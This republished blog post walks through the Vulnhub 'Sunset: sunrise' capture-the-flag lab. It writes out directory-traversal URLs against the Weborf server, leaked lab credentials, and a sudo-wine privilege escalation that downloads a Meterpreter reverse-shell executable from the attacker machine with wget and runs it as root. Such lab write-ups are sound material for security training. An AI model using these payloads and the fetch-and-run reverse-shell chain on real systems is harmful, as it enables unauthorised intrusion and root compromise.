---
title: 'Sunset-Sunrise: Vulnhub Walkthrough'
date: 2019-12-18T05:43:00+01:00
draft: false
---

In this article, we are going to crack the Sunset: sunrise Boot to Root Challenge and present a detailed walkthrough. The machine depicted in this Walkthrough is hosted on Vulnhub. Credit for making this machine goes to [whitecr0wz](https://twitter.com/whitecr0wz). Download this lab by clicking **[here](https://www.vulnhub.com/entry/sunset-sunrise,406/)**.

### **Penetration Testing Methodology**

*   **Network Scanning**
    *   Netdiscover Scan
    *   Nmap Scan
*   **Enumeration**
    *   Browsing HTTP Service
    *   Directory Bruteforce using dirb
    *   Enumeration using Searchsploit
*   **Exploitation**
    *   Exploiting the Directory Traversal
    *   Reading of User Flag
    *   Connection via SSH
    *   Enumeration of MySQL Service
*   **Post Exploitation**
    *   Enumeration for Sudo Permissions
    *   Generation of payload using MSFPC
    *   Transferring payload to Target Machine
    *   Reading Root Flag

### **Walkthrough**

**Network Scanning**

After running the downloaded virtual machine in the VMWare, the machine will automatically be assigned an IP address from the network DHCP, find the IP address of our target machine and for that please use the following command as it helps to see all the IP’s in an internal network:

```
netdiscover
```

![](https://i0.wp.com/1.bp.blogspot.com/-vBejTVUCjik/XfmpgeSgAgI/AAAAAAAAh9Y/j64jtwWlq7kJ9tgwCw0fRSjKd0sDAVZeACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

We found the target IP Address 192.168.1.197. The next step is to scan the target machine by using the Nmap tool. This is to find the open ports and services on the target machine and will help us to proceed further.

```
nmap -A 192.168.1.197
```

![](https://i0.wp.com/1.bp.blogspot.com/-5hZjNlmjPfk/XfmpjoZEbHI/AAAAAAAAh-A/3_YaLbuca6caLLfZfeJqrMG63CzX2vNEACLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

Here we performed an Aggressive Port Scan because we wanted to grab all the information. After the scan, we saw that port 22 was actively running the OpenSSH We also have the on port 80 with Apache http with mysql running on 3306. We also see that there is some kind of proxy running on the port 8080. This was the lay of the ground. Now let’s get to the enumeration.

### **Enumeration**

We started from port 80 and tried to browse the webpage on out browser. Much to our dismay it didn’t contained anything interesting. The port 8080 on the other had piqued our interest. So, we decide to take a look at it.

```
http://192.168.1.197:8080
```

We see that we have a directory listing with a sweet little footnote claiming that Weborf is running on this machine. We also got the version information from too. This server a good example of why information disclosure is a vulnerability.

![](https://i0.wp.com/1.bp.blogspot.com/-2koO7y5UzUc/XfmpkODaqyI/AAAAAAAAh-E/_EKitgXVZrwN-3MWouXepTQ0qBGex_LRQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Now without moving around much we decided to search the Weborf using searchsploit. If we don’t get a hit, then we will try something else. But we got a successful hit. It said that this version of the Weborf is vulnerable to Directory Traversal Exploit. This could be our way in. We downloaded the exploit contents on out attacker machine to get a read on this. The exploit gives us the path that is vulnerable. Let’s try that on out Target Machine.

```
searchsploit Weborf 0.12.2  
searchsploit -m 14925  
cat 14925.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-Lh-qlQnknug/Xfmpkd9nupI/AAAAAAAAh-I/WxvEsxGthNgj-a7cNx-mRpWtlFwPiWKtgCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

We went to our Web Browser and in the URL, we inject the line that was mentioned in the exploit. And figures that this machine is indeed vulnerable to Directory Traversal. We can read the /etc/passwd file.

![](https://i0.wp.com/1.bp.blogspot.com/-2HHPt0Ees4s/XfmpkpM-0XI/AAAAAAAAh-M/7Vqiu1bbso457peUl2e5pzgtxPApF_sAwCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

Now that we have a method to look around for files inside the target machine. We decided to take a loot at the user sunrise’s home directory. We can see that we have a user.txt file.

![](https://i0.wp.com/1.bp.blogspot.com/-frba7Wk2j40/XfmplHc2YwI/AAAAAAAAh-Q/RVrThaILig4baiocARX2TpG2yhsZrD1wwCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

We open the user.txt file to find this text as shown below. That seems like a simple user flag. That’s charming.

![](https://i1.wp.com/1.bp.blogspot.com/-K2cwMCF7pNI/Xfmplo6DACI/AAAAAAAAh-U/7KhedbY1AoUPFkOVfO07tBfEGBF1kBMZwCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Now although it seemed like a dead end, we decided to enumerate the target machine further using Directory Traversal. We made our way to the user Weborf user’s home directory.

![](https://i0.wp.com/1.bp.blogspot.com/-a1LFFkxtuzo/Xfmpltf8ayI/AAAAAAAAh-Y/TUR_r05gzOAzM-i74FReCYeYQ_hGvtyCwCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

Now instead of heading inside directly we decided to make an automated approach. It’s time for a Directory Bruteforce. We will use the dirb tool for this purpose. Within minutes we get the hidden file named .mysql history.

```
dirb http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..home%2fweborf%2f
```

![](https://i2.wp.com/1.bp.blogspot.com/-PTFLDm4Glgw/Xfmpl1o2rYI/AAAAAAAAh-c/awbC6F2_yx4FuVfnq4_cfd6maNb4XdWeACLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

As this file might contain some useful information, we decided to take a look. We see that it has a query that contains the user login credentials of Weborf. Yes!! Let’s try to get in.

```
http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..home%2fweborf%2f/.mysql history
```

![](https://i1.wp.com/1.bp.blogspot.com/-etTfUloOyo0/XfmpgQpWMsI/AAAAAAAAh9c/qpafnazJ4XAjIdYkXGkmxfiTxztPBnnKwCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

### **Exploitation**

We have successfully gained the credentials of the user Weborf. Since from the earlier nmap scan we saw that we have a ssh port open, let’s try to ssh our way in. After getting in the target machine, we started the enumeration based on the information we had from our initial scanning that there is a mysql service runnimg on the system. We login it to mysql using the Weborf credentials. We run the show databases; command to get the names of databases.

```
ssh weborf@192.168.1.197  
iheartrainbows44  
mysql -u weborf -p  
show databases;
```

![](https://i1.wp.com/1.bp.blogspot.com/-BUXU44i314E/XfmpgYs-bQI/AAAAAAAAh9g/oTfdgQAr0zITamxKiFPwZmErGAfF9kfgACLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

We decided to enumerate database named mysql. We selected mysql database and started to look at the tables that were created inside this database. Among some tables we see that we have a table called user. That’s looks important.

```
use mysql;  
show tables;
```

![](https://i0.wp.com/1.bp.blogspot.com/-TcOnJyEIgNE/XfmphVuPzEI/AAAAAAAAh9k/_wmCZIXuVTM5ycBLHuLlAdKIFz2ozonDACLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

Upon a closer look at the user table, we see that we have an entry in the user table that consists of the credentials of another user named sunrise. It is “**thefutureissobrightigottawearshades**”. Well, a person keeping this kind of passwords don’t have bright future.

![](https://i0.wp.com/1.bp.blogspot.com/-qYDhRw9Imww/XfmphgaqbBI/AAAAAAAAh9o/s28tooQvYJwQ6b4VIz6LuaYxfY5FgoQnwCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

We tried to login as the user sunrise with the password that we found earlier. After logging in we try to find improper sudo permissions. Upon close inspection we see that the user sunrise can run wine service with root privileges. This kind of got use thinking because this kind of scenario we haven’t faced earlier. Kudos to the Lab author for thinking out of the box here.

```
su sunrise  
sudo -l  
cd /tmp
```

![](https://i0.wp.com/1.bp.blogspot.com/-8pShrDzOUKM/Xfmph1V1IsI/AAAAAAAAh9s/ga9cfqggMsEiWOctRo7RV2OeyEhlFuxDACLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

### **Post Exploitation**

Now we could go on and on about the libraries but as this is a CTF Challenge, we try to explain as shortly as possible.

[Wine (recursive backronym for Wine Is Not an Emulator)](https://en.wikipedia.org/wiki/Wine_(software)) is a free and open-source compatibility layer that aims to allow computer programs (application software and computer games) developed for Microsoft Windows to run on Unix-like operating systems.

Now as we can run wine as root, we will create a payload that can be executed using wine. We will be using msfpc for the payload creation. After creating the payload, we will run the python one liner for transferring the payload to the target machine.

```
msfpc windows 192.168.1.107  
python2 -m SimpleHTTPServer 8080
```

![](https://i0.wp.com/1.bp.blogspot.com/-gsG7c4XKdnk/XfmpiRUDk4I/AAAAAAAAh9w/o7XfpfeTB_IOwVe2D3mhe6mfwWH5oguyACLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

Since we have hosted the payload on the attacker machine, we will use the wget tool for downloading the said file to the target machine. After the successful transfer of the payload to the target machine we will be executing the payload using wine along with sudo.

```
wget http://192.168.1.107:8080/windows-meterpreter-staged-reverse-tcp-443.exe  
sudo wine windows-meterpreter-staged-reverse-tcp-443.exe
```

![](https://i2.wp.com/1.bp.blogspot.com/-G59q3GcrZ88/XfmpirK1s9I/AAAAAAAAh90/Hj-iVcci-LU2a7v40yPlMh713DTQgbr4ACLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

When we used the msfpc tool to generate the payload, a Metasploit Framework ruby file is also generated with the configuration that is required to run the listener for the payload. We ran that ruby file and when we ran the file using wine on that target machine. We see that a meterpreter session pops up. As the file was executed with wine which was had root privileges the shell, we got was root as well.  We traverse into the root directory and when we list all the files inside this directory, we see that we find a file named root.txt.

```
session 1  
cd /root  
ls
```

![](https://i0.wp.com/1.bp.blogspot.com/-4mDZWUlj8pU/Xfmpi8b8fVI/AAAAAAAAh94/M7bBcIPFD7wtImaLF6LWSCV9vRy3UnY0gCLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

Let’s read the root flag and conclude this CTF Challenge.

```
cat root.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-phsy39-7c-4/XfmpjVbeICI/AAAAAAAAh98/6H3_ViS_JO8Xzq2Wyf6jEIrRRc-rzpXaQCLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

**Author: Pavandeep Singh** is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on [Twitter](https://twitter.com/pavan2318) and [LinkedIn](https://www.linkedin.com/in/pavandeep-singh-6b1074132)

The post [Sunset-Sunrise: Vulnhub Walkthrough](https://www.hackingarticles.in/sunset-sunrise-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2rWB7gJ